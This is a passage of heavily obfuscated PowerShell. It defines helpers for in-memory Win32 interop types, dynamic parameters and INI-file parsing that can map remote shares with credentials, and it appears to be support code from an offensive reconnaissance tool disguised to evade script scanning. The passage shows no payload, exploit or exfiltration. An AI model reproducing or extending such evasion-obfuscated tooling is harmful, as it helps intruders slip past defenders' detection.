












function n`e`w-INm`Em`o`RyModULe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{5}{10}{1}{0}{4}{3}{8}{6}{7}{2}{9}" -f 'ouldPro','eSh','n','or','cessF','P','angin','gFunctio','StateCh','s','SUs'}, '')]
    [CmdletBinding(   )]
    Param (
        [Parameter(positION   = 0 )]
        [ValidateNotNullOrEmpty(  )]
        [String]
        $ModuleName =   [Guid]::nEWgUiD(    ).TOsTRInG(  )
     )

    $AppDomain  =   [Reflection.Assembly].assEMBLy.GeTtYpe( ("{0}{2}{1}" -f 'S','n','ystem.AppDomai'  )  ).GeTpROpErty(  ( "{2}{3}{1}{0}"-f'in','Doma','Curr','ent' )  ).GetVaLuE( $null, @(  )  )
    $LoadedAssemblies   =  $AppDomain.GetASSEMBlieS(    )

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.fuLlNAMe -and ( $Assembly.fuLLNAmE.spLiT( ',' )[0] -eq $ModuleName  )  ) {
            return $Assembly
        }
    }

    $DynAssembly   = New-Object ('R'+  'eflectio' + 'n'  +'.' +'Asse' + 'mb'  +'lyName')( $ModuleName )
    $Domain = $AppDomain
    $AssemblyBuilder  =  $Domain.DEfineDyNAmIcaSsEMbly( $DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefiNedYnamicmoduLE(  $ModuleName, $False )

    return $ModuleBuilder
}




function fU`NC {
    Param ( 
        [Parameter( posITion  = 0, MaNDATorY   = $True )]
        [String]
        $DllName,

        [Parameter(  poSitION   =   1, manDaTORY  =  $True)]
        [string]
        $FunctionName,

        [Parameter(  PoSItioN =   2, maNDATOry =   $True )]
        [Type]
        $ReturnType,

        [Parameter(  posItiOn =  3 )]
        [Type[]]
        $ParameterTypes,

        [Parameter( POsitIOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter( pOSItIon =  5 )]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
      )

    $Properties   = @{
        DLlnAME = $DllName
        FuNctiOnnamE   =  $FunctionName
        RetURNTYPe =   $ReturnType
    }

    if (  $ParameterTypes  ) { $Properties[(  "{1}{2}{0}"-f 'rTypes','Param','ete'  )]   = $ParameterTypes }
    if (  $NativeCallingConvention ) { $Properties[("{5}{6}{1}{2}{4}{3}{0}"-f 'on','ingCo','nv','i','ent','Nativ','eCall' )]   =   $NativeCallingConvention }
    if ( $Charset  ) { $Properties[(  "{1}{0}" -f'et','Chars')] = $Charset }
    if ($SetLastError) { $Properties[( "{2}{0}{3}{1}" -f'tLast','or','Se','Err'  )]   =   $SetLastError }
    if ( $EntryPoint  ) { $Properties[(  "{0}{2}{1}"-f 'EntryPo','nt','i')]   = $EntryPoint }

    New-Object (  'PS' + 'Obj'  + 'ect'  ) -Property $Properties
}


function aDd`-`wIn32tyPe
{


    [OutputType([Hashtable]  )]
    Param(
        [Parameter(mandatory=  $True, ValUEFrOMPIPElINeBYPRopERTYname  = $True  )]
        [String]
        $DllName,

        [Parameter( manDAtOry =  $True, vAlueFRoMPIpELinebYProPertynAme =$True  )]
        [String]
        $FunctionName,

        [Parameter(  ValUEFroMPipelInEByProPERtYNamE = $True )]
        [String]
        $EntryPoint,

        [Parameter(ManDAtORY = $True, VAluEfROmpiPELINEbYpRoPeRtYNamE =  $True)]
        [Type]
        $ReturnType,

        [Parameter( ValUeFrOmpIPElinebyprOpeRtyNaME  = $True  )]
        [Type[]]
        $ParameterTypes,

        [Parameter(VAlueFRompipElinEbYPRopERTYNaME = $True  )]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention  =   [Runtime.InteropServices.CallingConvention]::sTdCaLl,

        [Parameter( vaLueFrOmPipEliNEByprOpertyNaMe =$True  )]
        [Runtime.InteropServices.CharSet]
        $Charset  =   [Runtime.InteropServices.CharSet]::auTo,

        [Parameter( VaLUefROmPiPELINEbYpRoPERtYname  =  $True)]
        [Switch]
        $SetLastError,

        [Parameter(  manDAtORy =  $True  )]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or (  $_ -is [Reflection.Assembly] )}  )]
        $Module,

        [ValidateNotNull( )]
        [String]
        $Namespace  = ''
     )

    BEGIN
    {
        $TypeHash   = @{}
    }

    PROCESS
    {
        if (  $Module -is [Reflection.Assembly])
        {
            if (  $Namespace )
            {
                $TypeHash[$DllName]  = $Module.getTypE("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] =   $Module.GeTTYpE( $DllName  )
            }
        }
        else
        {
            
            if (  !$TypeHash.cOntainSKEy($DllName  )  )
            {
                if ( $Namespace)
                {
                    $TypeHash[$DllName]  = $Module.dEfiNeTypE( "$Namespace.$DllName", ( "{3}{2}{4}{0}{1}"-f'ldI','nit','c,Befor','Publi','eFie')  )
                }
                else
                {
                    $TypeHash[$DllName]   = $Module.dEfiNeTyPE( $DllName, (  "{4}{2}{3}{5}{0}{1}"-f 'FieldI','nit','ic,B','efo','Publ','re'  ) )
                }
            }

            $Method =  $TypeHash[$DllName].dEFINEMeThod(
                $FunctionName,
                ("{6}{2}{5}{0}{1}{4}{3}" -f'Sta','tic,Pi','i','l','nvokeImp','c,','Publ'),
                $ReturnType,
                $ParameterTypes  )

            
            $i  = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.iSbyREf )
                {
                    [void] $Method.dEFINepARAmeter( $i, 'Out', $null)
                }

                $i++
            }

            $DllImport =   [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField   =  $DllImport.GeTfIeLd( ( "{2}{0}{1}"-f'rro','r','SetLastE')  )
            $CallingConventionField   =   $DllImport.GETfIeLD( ( "{1}{3}{0}{2}" -f'Conventi','C','on','alling'  ) )
            $CharsetField   =  $DllImport.GEtfIELD((  "{2}{0}{1}" -f 'ar','Set','Ch'  )  )
            $EntryPointField  =  $DllImport.getFIelD( ( "{1}{0}{2}"-f'ryP','Ent','oint' )  )
            if ( $SetLastError  ) { $SLEValue  =  $True } else { $SLEValue =  $False }

            if ($PSBoundParameters[("{1}{0}{2}"-f 'Poin','Entry','t'  )] ) { $ExportedFuncName  =   $EntryPoint } else { $ExportedFuncName   =  $FunctionName }

            
            $Constructor   = [Runtime.InteropServices.DllImportAttribute].GEtCONsTRUcTOR([String] )
            $DllImportAttribute =   New-Object ( 'R' +'e' + 'flection.' +  'Emit'  + '.CustomAttribut' +  'eBui'+'lder')($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @( ), [Object[]] @( ),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField ),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention ),
                             (  [Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName  ))

            $Method.SETcuStomaTtRIbuTe( $DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly]  )
        {
            return $TypeHash
        }

        $ReturnTypes  =   @{}

        foreach ( $Key in $TypeHash.KeyS )
        {
            $Type  =   $TypeHash[$Key].CReaTETYpE(  )

            $ReturnTypes[$Key]  =  $Type
        }

        return $ReturnTypes
    }
}


function PS`E`NUM {


    [OutputType( [Type]  )]
    Param (  
        [Parameter( pOsItIon  =   0, MaNDAtORy =  $True  )]
        [ValidateScript(  {( $_ -is [Reflection.Emit.ModuleBuilder]  ) -or (  $_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(  POsITIoN =  1, MANDaTory=$True )]
        [ValidateNotNullOrEmpty( )]
        [String]
        $FullName,

        [Parameter(POsition  =  2, MANDATory=$True  )]
        [Type]
        $Type,

        [Parameter( poSition  =   3, maNDatorY  =  $True)]
        [ValidateNotNullOrEmpty( )]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
     )

    if (  $Module -is [Reflection.Assembly])
    {
        return ( $Module.GetType( $FullName  ) )
    }

    $EnumType  =   $Type -as [Type]

    $EnumBuilder   =   $Module.DefineeNUM(  $FullName, (  "{0}{1}"-f 'Publi','c' ), $EnumType )

    if ($Bitfield  )
    {
        $FlagsConstructor =   [FlagsAttribute].GeTConstrUCtor(  @( ))
        $FlagsCustomAttribute   =  New-Object ( 'R'  +'eflection'  +  '.Emi'+  't.Cus'  + 'tomAttribu'+ 'teBu'  + 'ilder'  )($FlagsConstructor, @( ) )
        $EnumBuilder.SetCusTOmaTtRiBUte($FlagsCustomAttribute )
    }

    foreach (  $Key in $EnumElements.keyS)
    {
        
        $null   =   $EnumBuilder.DEFInelIteRal( $Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.creatEtYPe(  )
}




function f`ield {
    Param (
        [Parameter(poSiTIOn  = 0, MAnDatorY=$True )]
        [UInt16]
        $Position,

        [Parameter(pOsItIon  =   1, mAnDaTorY=$True  )]
        [Type]
        $Type,

        [Parameter(  poSITion  =  2  )]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
     )

    @{
        PoSItION  = $Position
        TYpE   = $Type -as [Type]
        ofFset  =   $Offset
        MArsHAlas =   $MarshalAs
    }
}


function S`TRucT
{


    [OutputType(  [Type])]
    Param (  
        [Parameter(  posiTIon =  1, MAndAtoRy=$True )]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]  ) -or (  $_ -is [Reflection.Assembly] )})]
        $Module,

        [Parameter( PosItIon  = 2, MANdaTory =  $True  )]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $FullName,

        [Parameter( posiTIoN   = 3, maNDaTOry =$True )]
        [ValidateNotNullOrEmpty(  )]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize   =   [Reflection.Emit.PackingSize]::unSpECIfied,

        [Switch]
        $ExplicitLayout
      )

    if ( $Module -is [Reflection.Assembly] )
    {
        return ($Module.getTyPE( $FullName)  )
    }

    [Reflection.TypeAttributes] $StructAttributes  = ( "{8}{7}{0}{5}{2}{6}{10}{13}{19}{9}{16}{1}{12}{3}{4}{11}{18}{15}{14}{17}"-f 'C','   ','ass','c,
      ','  ','l',',
   ','si','An','  ','  ','Sealed,
    ','Publi','   ','ni','eFieldI',' ','t','    Befor','Class,
  '  )

    if ($ExplicitLayout  )
    {
        $StructAttributes   =  $StructAttributes -bor [Reflection.TypeAttributes]::exPlICiTLaYoUT
    }
    else
    {
        $StructAttributes  =   $StructAttributes -bor [Reflection.TypeAttributes]::sEQuENtIaLLayOUt
    }

    $StructBuilder   = $Module.DEFinetYpE( $FullName, $StructAttributes, [ValueType], $PackingSize )
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GETCONSTRuCTOrs(   )[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].gETfIELd( (  "{0}{2}{1}"-f'Siz','nst','eCo'  ) )  )

    $Fields  = New-Object ('Has' + 'hta' +  'ble[]' )(  $StructFields.CouNT)

    
    
    
    foreach ($Field in $StructFields.keys )
    {
        $Index =   $StructFields[$Field][( "{0}{1}" -f 'Positio','n'  )]
        $Fields[$Index]   =  @{FIeldnAMe =  $Field  ;  proPeRtIes  =  $StructFields[$Field]}
    }

    foreach ($Field in $Fields )
    {
        $FieldName  = $Field[(  "{2}{0}{1}" -f 'dNam','e','Fiel' )]
        $FieldProp =  $Field[("{2}{1}{0}" -f 'rties','ope','Pr')]

        $Offset =  $FieldProp[("{1}{0}"-f 'ffset','O'  )]
        $Type  =  $FieldProp[("{0}{1}" -f'Ty','pe'  )]
        $MarshalAs   =   $FieldProp[("{0}{2}{1}" -f'Ma','As','rshal'  )]

        $NewField   =  $StructBuilder.DeFiNEFieLd($FieldName, $Type, ("{0}{1}" -f 'Publ','ic' ) )

        if ( $MarshalAs  )
        {
            $UnmanagedType  = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType]  )
            if ($MarshalAs[1]  )
            {
                $Size =   $MarshalAs[1]
                $AttribBuilder =   New-Object (  'Ref'  +'lection.Emit.C' + 'ust'  +'om'  +'A'+  't'+ 'tr'  +'ibuteBu' + 'ilder')($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size  ) )
            }
            else
            {
                $AttribBuilder =   New-Object ('Ref'+  'l'+'ect'  +  'io'  + 'n.'+'Emit.Custo'  +'mAt'  +  'tri'+  'but'  +'eBu'  +  'ilder' )(  $ConstructorInfo, [Object[]] @($UnmanagedType )  )
            }

            $NewField.SETcusTOMaTTRIbUTE(  $AttribBuilder )
        }

        if (  $ExplicitLayout  ) { $NewField.seToFfSET($Offset  ) }
    }

    
    
    $SizeMethod  =   $StructBuilder.DeFiNEmetHoD(  ( "{1}{2}{0}"-f'ize','G','etS' ),
        ( "{2}{0}{3}{1}" -f ', Sta','c','Public','ti'),
        [Int],
        [Type[]] @(  ) )
    $ILGenerator = $SizeMethod.geTiLGENerAtOr(  )
    
    $ILGenerator.EmIt([Reflection.Emit.OpCodes]::lDtokeN, $StructBuilder)
    $ILGenerator.eMIt(  [Reflection.Emit.OpCodes]::CALL,
        [Type].GETmETHoD((  "{5}{3}{4}{0}{1}{2}" -f 'H','a','ndle','etTypeFro','m','G'  )))
    $ILGenerator.EmiT( [Reflection.Emit.OpCodes]::CALL,
        [Runtime.InteropServices.Marshal].GETMeTHod( (  "{0}{1}" -f 'SizeO','f'  ), [Type[]] @([Type]  )) )
    $ILGenerator.eMIt( [Reflection.Emit.OpCodes]::rET)

    
    
    $ImplicitConverter  =   $StructBuilder.deFinemEthoD(  ("{3}{0}{2}{1}"-f'mpl','it','ic','op_I'  ),
        (  "{1}{7}{5}{6}{2}{0}{3}{4}{8}" -f',','Priv','blic, Static',' HideByS','ig, Special','eScope',', Pu','at','Name'),
        $StructBuilder,
        [Type[]] @([IntPtr] ) )
    $ILGenerator2  =   $ImplicitConverter.GeTIlgeNErATOR(   )
    $ILGenerator2.EMIT([Reflection.Emit.OpCodes]::nop  )
    $ILGenerator2.emIT( [Reflection.Emit.OpCodes]::LDarg_0)
    $ILGenerator2.EMIT([Reflection.Emit.OpCodes]::lDToKEn, $StructBuilder  )
    $ILGenerator2.EMIT([Reflection.Emit.OpCodes]::caLL,
        [Type].geTmEthOD(  (  "{0}{1}{2}{3}" -f'Ge','tTyp','eFrom','Handle'))  )
    $ILGenerator2.eMIT(  [Reflection.Emit.OpCodes]::cALl,
        [Runtime.InteropServices.Marshal].getMethoD((  "{3}{0}{1}{2}" -f 'r','uc','ture','PtrToSt'), [Type[]] @([IntPtr], [Type] ))  )
    $ILGenerator2.eMiT(  [Reflection.Emit.OpCodes]::UnboX_Any, $StructBuilder)
    $ILGenerator2.emIT([Reflection.Emit.OpCodes]::REt)

    $StructBuilder.cReAtetyPe(  )
}








Function NEw`-`dY`NA`mIc`pArAmEt`Er {


    [CmdletBinding(  dEfAUlTPArAMEtersetNAmE   =   {"{3}{1}{2}{4}{0}" -f 'r','n','am','Dy','icParamete'} )]
    Param (
        [Parameter( ManDAtORY  =   $true, VAluefrOMpiPeLIne  =  $true, VAlUeFRoMpIpEliNeByPROpERtYnaMe   = $true, PaRAMEtErsetnAmE  =  "DYnA`mI`c`pA`RaMETer" )]
        [ValidateNotNullOrEmpty(   )]
        [string]$Name,

        [Parameter(VALuEfROMpiPELINebyPrOpERtYnAME   =   $true, PARAmETERSEtnaME   = "D`YnAmI`c`Pa`RAmetER")]
        [System.Type]$Type   = [int],

        [Parameter( vaLUefrOmPiPeLiNebypRoPERtYNAmE   =   $true, PaRaMeTErsEtNaME   =   "D`y`NAMIcp`AR`AMETer"  )]
        [string[]]$Alias,

        [Parameter(  valuEfROMPiPElIneByPrOPertyNAme  =  $true, PARAMEtersETNAME   = "D`YNAmiCPa`R`AMeter" )]
        [switch]$Mandatory,

        [Parameter(  VaLUEFRoMPIPElInebyPROPERtynAmE   = $true, pArAMETeRSEtnaMe  =   "dy`N`AMicPaR`A`meTER" )]
        [int]$Position,

        [Parameter( vALUEfROMpIPEliNebYPROpErtYnaME   =  $true, pAramETERsetnamE   = "D`Ynam`I`CparA`Meter")]
        [string]$HelpMessage,

        [Parameter( vALUEFRomPiPElInEBYPrOPeRTYnAME  =  $true, PaRametERSetname = "dYnAmI`c`Pa`Ram`EteR")]
        [switch]$DontShow,

        [Parameter(  ValUeFROMpIpELineByPrOpERtynAMe   =  $true, pArametErseTNaMe =  "dYNaM`IcpAr`A`METeR")]
        [switch]$ValueFromPipeline,

        [Parameter(vaLUefROmpIPELINEBYpROpERtYName   =   $true, pArAMetErSetNAMe   =   "D`Yna`m`I`cpaRamEteR")]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter( VaLuEFRompIpELINeBYPropErTyName = $true, pARamEtErSeTnAme  =  "dy`NAMICp`ArAm`e`TER")]
        [switch]$ValueFromRemainingArguments,

        [Parameter(  ValueFrompIPeLIneBYpRoPerTyNaMe  = $true, pAraMEtErsetnAMe  =  "dYNaMI`c`p`ARAmEter")]
        [string]$ParameterSetName =   "__al`lp`Aram`E`T`ERSETs",

        [Parameter(  vaLuEFromPiPElINEByproPERTYName  =  $true, paRAmEterSETnAme  = "D`yNAm`iCpaRamE`TEr"  )]
        [switch]$AllowNull,

        [Parameter(  vAlUeFROmPIPElinEByPrOperTyNaMe = $true, PaRamETErSEtname =  "DYNaMi`cparAm`ET`er" )]
        [switch]$AllowEmptyString,

        [Parameter(  vAlUEFRomPIpeLiNeBYpropeRtYnaMe   =   $true, parametersetNAMe  =   "dY`Nam`IcPaRa`meTeR")]
        [switch]$AllowEmptyCollection,

        [Parameter( vAluEFRoMpiPelINeBYPROperTYnaME  = $true, paRaMeTeRSetNAme =   "DYn`AMic`parAM`EteR" )]
        [switch]$ValidateNotNull,

        [Parameter( valueFROmpiPElINebyproPertyNaMe =  $true, pArAMEtERSEtnAME   = "DYN`AmI`c`Para`MeteR" )]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValUefRompipELiNEbYprOPeRtYNamE   = $true, paraMEterseTnAMe   =   "dYNamIc`pa`R`AMe`TER" )]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(  VALUeFROMpiPeLinebYpROPertYNAMe =  $true, pARamEteRSetNAME  =  "DynA`MI`cP`Ar`AmEter" )]
        [ValidateCount(2,2  )]
        [int[]]$ValidateRange,

        [Parameter(vALuefroMpIPeLINeBYPRoPERtynamE  = $true, PARamETErseTNAME =   "dYNAmI`CpA`RaMEt`er")]
        [ValidateCount( 2,2 )]
        [int[]]$ValidateLength,

        [Parameter(ValUeFrOMPipeLINebYPropertYNAMe = $true, PARAMetERSeTnAMe   =   "dYnaM`ICPar`AM`eT`Er" )]
        [ValidateNotNullOrEmpty( )]
        [string]$ValidatePattern,

        [Parameter(  VAluEFrOmpIPELiNebYprOperTYNAMe   =   $true, PAraMETErseTNaME =   "d`yN`AMIC`PaRAmeteR")]
        [ValidateNotNullOrEmpty(    )]
        [scriptblock]$ValidateScript,

        [Parameter( VaLuEfRoMpIPELINEBYPropeRTyname   =   $true, pArameteRseTnAMe  =  "d`yNAMI`cpaRam`ET`er"  )]
        [ValidateNotNullOrEmpty(   )]
        [string[]]$ValidateSet,

        [Parameter(vaLuEFRoMpIpelINebypROPErtynAme =  $true, paRAmETeRSeTName   =   "d`yna`micPaR`AME`TEr" )]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]  ))
            {
                Throw (  "{6}{14}{7}{15}{3}{4}{12}{5}{18}{17}{10}{2}{8}{1}{16}{13}{9}{0}{11}" -f 'ar','rD','edPara','mus','t be a System','anag','D','onar','mete','n','ntimeDefin','y object','.M','io','icti','y ','ict','ation.Ru','ement.Autom'  )
            }
            $true
        }  )]
        $Dictionary   =   $false,

        [Parameter( MANdatoRy =  $true, VaLueFROMpIPeLiNebYPRopErtYnamE   = $true, PARAMEteRseTNaMe  = "C`Re`A`TeVA`RIabLes" )]
        [switch]$CreateVariables,

        [Parameter(  mANDAtORy   = $true, VALueFrOMPIpeLINebYPRoPErtynAme   =  $true, PAraMETerseTNAmE  =  "c`REaTEvA`R`i`ABLes" )]
        [ValidateNotNullOrEmpty(  )]
        [ValidateScript(  {
            
            
            if($_.GeTTyPE().naMe -notmatch ("{2}{1}{0}" -f'onary','i','Dict')  ) {
                Throw ("{2}{17}{0}{14}{13}{11}{15}{7}{5}{10}{6}{4}{8}{12}{1}{3}{16}{9}" -f'r','on','B','ary','dParameters','matio','oun','uto','D','ect','n.PSB','m.Management','icti','e','s must be a Syst','.A',' obj','oundParamete'  )
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName (  'System.Mana' +  'ge'  + 'm' +  'ent.Au' +  'tomat' +  'ion'  + '.Runtime' +'Defin'+'edP'+  'aramete'+ 'rD'  + 'ic' + 'tionary')
        function _`TeMP { [CmdletBinding()] Param(  ) }
        $CommonParameters   =   (Get-Command (  '_te'+'mp' )).PAraMETERS.KEYs
    }

    Process {
        if( $CreateVariables  ) {
            $BoundKeys  =   $BoundParameters.KeYs   |  Where-Object { $CommonParameters -notcontains $_ }
            ForEach( $Parameter in $BoundKeys ) {
                if ($Parameter  ) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys =   @()
            $StaleKeys  = $PSBoundParameters.GETenUmERAtOr(  )  |
                        ForEach-Object {
                            if($_.value.psOBject.MeTHODS.naME -match (  (  '^Eq' +'uals{0}'  )-F [char]36  ) ) {
                                
                                if(!$_.VALue.EqUAlS(  ( Get-Variable -Name $_.KEY -ValueOnly -Scope 0))  ) {
                                    $_.keY
                                }
                            }
                            else {
                                
                                if($_.vALuE -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0) ) {
                                    $_.kEY
                                }
                            }
                        }
            if( $StaleKeys ) {
                $StaleKeys |   ForEach-Object {[void]$PSBoundParameters.rEMOVe($_)}
            }

            
            $UnboundParameters   = (  Get-Command -Name ( $PSCmdlet.mYInvoCAtION.InvocaTIonNAme )  ).pARaMEtErS.GeTEnUMeratOR(  )  | 
                                        
                                        Where-Object { $_.value.parAmeteRSEtS.keys -contains $PsCmdlet.PArAmEtERseTname }  | 
                                            Select-Object -ExpandProperty ('K'+ 'ey') | 
                                                
                                                Where-Object { $PSBoundParameters.KeYS -notcontains $_ }

            
            $tmp   =  $null
            ForEach ( $Parameter in $UnboundParameters  ) {
                $DefaultValue =  Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if( !$PSBoundParameters.tRygEtvAlue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter   = $DefaultValue
                }
            }

            if(  $Dictionary) {
                $DPDictionary =  $Dictionary
            }
            else {
                $DPDictionary =   $InternalDictionary
            }

            
            $GetVar   =   {Get-Variable -Name $_ -ValueOnly -Scope 0}

            
            $AttributeRegex  =   ( (  '^(Manda'+ 'toryJrgPositionJr' +'gParameterSetNameJ'  +  'rgDontShowJrg'  +'HelpMess'+'a'  +'g' + 'e' + 'J'  +'rgV' +  'alue'  +  'FromPi' +'pe' +'li'+ 'neJr'+'gValue'  + 'Fr'+  'o'+  'mPi' +'pe'  +'li'+'neByProper' + 'tyNam'  +  'eJrgValueFrom'+'Rem'+ 'a' +  'i'+ 'n'  +'ing'  +  'Argum'  + 'ents)g8C').REpLAcE( 'Jrg','|' ).REPlaCE( 'g8C',[strING][cHaR]36 ) )
            $ValidationRegex   = (((  '^(AllowNull' +'C'+'4ZAllowE' + 'mpt' + 'ySt'  +  'ringC4'+  'ZA'  +  'l' + 'lowEmptyC'  + 'ollectio' +'nC4'  +'ZVal' + 'id'+'at' +  'eCountC4'  +  'ZValidateLength'  +  'C'+'4ZValidat'+'ePatternC'  +'4'  + 'ZValidateR'+  'ange'+'C4Z' + 'V'  +  'alidateSc' +'riptC4ZVali' +'dateSe'+'tC4ZVa' +  'lid'  + 'ateNo' + 'tNu'  +  'llC4ZValidat' +'e'  +'N' +  'ot' +'NullOr' +'Empty'  +')X'  + '37' )  -cRePLACE ( [chAR]88  + [chAR]51  +  [chAR]55),[chAR]36-cRePLACE  'C4Z',[chAR]124 )  )
            $AliasRegex =  {( '^Alias'  +'{'+'0}'  ) -F [CHAr]36}
            $ParameterAttribute =   New-Object -TypeName ('System.Ma'  +'nag'+'ement.'  +  'Aut'+'omatio'  + 'n.Paramete'  + 'rAtt' +'ribute')

            switch -regex (  $PSBoundParameters.kEYS) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_  =    .  $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if( $DPDictionary.KEys -contains $Name  ) {
                $DPDictionary.$Name.aTTRibutEs.adD($ParameterAttribute )
            }
            else {
                $AttributeCollection   = New-Object -TypeName ('C' +  'o'+  'l' + 'lections.'+ 'Objec' +'tM'+  'od'+ 'el.C'+ 'olle' +'cti' +  'on'  + '[Sy'+ 'st'+  'em.A' +  'ttrib' +'ute]'  )
                switch -regex ( $PSBoundParameters.KeYS) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions  =   New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList ( . $GetVar) -ErrorAction ( 'S'  +  'top')
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias   =   New-Object -TypeName ( 'S' +'ystem.Manage'+'ment.Au' +'to'+'matio'  +'n'  + '.'+'Alias'+  'Att'  + 'rib' +  'ute') -ArgumentList (. $GetVar) -ErrorAction ( 'S'  +  'top')
                            $AttributeCollection.adD($ParameterAlias )
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.AdD( $ParameterAttribute )
                $Parameter   =  New-Object -TypeName ('S'+ 'y'+'s' +  'tem.Ma'  + 'na'+ 'ge' + 'ment.Automa' +  't' + 'ion.'+'Ru' +'ntimeDefinedP' + 'a'  +'ramet' + 'er'  ) -ArgumentList @($Name, $Type, $AttributeCollection )
                $DPDictionary.AdD($Name, $Parameter )
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary  ) {
            $DPDictionary
        }
    }
}


function g`eT`-inICoNT`e`Nt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{3}{0}{2}{1}"-f 'uld','ocess','Pr','PSSho'}, '' )]
    [OutputType( [Hashtable]  )]
    [CmdletBinding(  )]
    Param(  
        [Parameter(  posItIOn  = 0, MandatORY  =   $True, vaLUEFROMpiPeliNe  =  $True, VALUeFrompipeliNEbyproPERtyname =  $True)]
        [Alias(  {"{0}{2}{1}"-f'Ful','me','lNa'}, {"{1}{0}" -f 'e','Nam'} )]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =  [Management.Automation.PSCredential]::EMPTY,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers  =   @{}
    }

    PROCESS {
        ForEach ( $TargetPath in $Path  ) {
            if ( ($TargetPath -Match ( (  ( "{2}{5}{1}{0}{3}{6}{4}" -f 'dY','Yh','dYhdYh','h.*dYh','*','d','dYh.'  )).REpLaCE('dYh','\'  ) )  ) -and ($PSBoundParameters[(  "{2}{0}{1}" -f 'rede','ntial','C'  )])) {
                $HostComputer   = ( New-Object (  'S'  +  'ystem'  +  '.Uri'  )($TargetPath  ) ).HOsT
                if (  -not $MappedComputers[$HostComputer] ) {
                    
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if ( Test-Path -Path $TargetPath ) {
                if ( $PSBoundParameters[(  "{1}{0}{2}" -f 'Ob','Output','ject' )]) {
                    $IniObject  =  New-Object ('P'  +'SO'  + 'bject'  )
                }
                else {
                    $IniObject =   @{}
                }
                Switch -Regex -File $TargetPath {
                    ( (  ( "{2}{0}{3}{1}" -f'sDN[','.+)sDN]','^','('  ) ) -ReplACe'sDN',[ChAR]92  ) 
                    {
                        $Section  = $matches[1].TriM(  )
                        if (  $PSBoundParameters[(  "{2}{1}{0}" -f't','bjec','OutputO'  )]  ) {
                            $Section =   $Section.RepLACE(' ', '' )
                            $SectionObject   =  New-Object ( 'PSO'+ 'bject'  )
                            $IniObject   |  Add-Member ('N'  +  'otep'  + 'rop'  +'erty') $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount   =  0
                    }
                    "^(;.*)$" 
                    {
                        $Value   = $matches[1].trIm(  )
                        $CommentCount   =   $CommentCount +  1
                        $Name =   ("{0}{2}{1}"-f 'Com','t','men') +   $CommentCount
                        if ($PSBoundParameters[( "{1}{0}{3}{2}" -f 'ut','O','Object','put' )] ) {
                            $Name   = $Name.REPlAce( ' ', '')
                            $IniObject.$Section |   Add-Member ( 'Notep'+ 'rop'+ 'ert' +'y' ) $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name]   =  $Value
                        }
                    }
                    ( (  ("{3}{0}{4}{2}{1}{5}" -f '.','*=(.*','s','(','+?){0}',')' ))  -F  [CHAR]92 ) 
                    {
                        $Name, $Value  =   $matches[1..2]
                        $Name   = $Name.tRim(  )
                        $Values  = $Value.SPLit(',' ) |  ForEach-Object { $_.tRiM(   ) }

                        

                        if ($PSBoundParameters[("{0}{2}{3}{1}"-f 'Ou','ject','tputO','b'  )] ) {
                            $Name   =   $Name.ReplACe( ' ', '' )
                            $IniObject.$Section  | Add-Member ('Not' +  'eprop' +'erty') $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
